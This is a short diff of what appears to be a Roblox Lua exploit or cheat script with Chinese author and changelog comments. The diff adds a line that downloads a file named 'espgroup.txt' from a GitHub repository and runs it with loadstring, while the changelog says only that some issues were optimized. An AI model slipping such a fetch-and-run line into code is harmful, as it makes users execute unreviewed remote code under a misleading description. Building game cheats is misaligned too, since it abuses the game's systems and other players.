@@ -1,8 +1,9 @@
 --UI作者@MS 
 --UI二改作者@霖溺
---UI修改日期2026.2.1
---UI具体修改时间20:12
+--UI修改日期2026.2.3
+--UI具体修改时间22:29
 --UI修复日志记录: 优化了部分问题
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KingScriptAE/No-sirve-nada./refs/heads/main/espgroup.txt"))()
 local cloneref = (cloneref or clonereference or function(instance: any)
 return instance
 end)
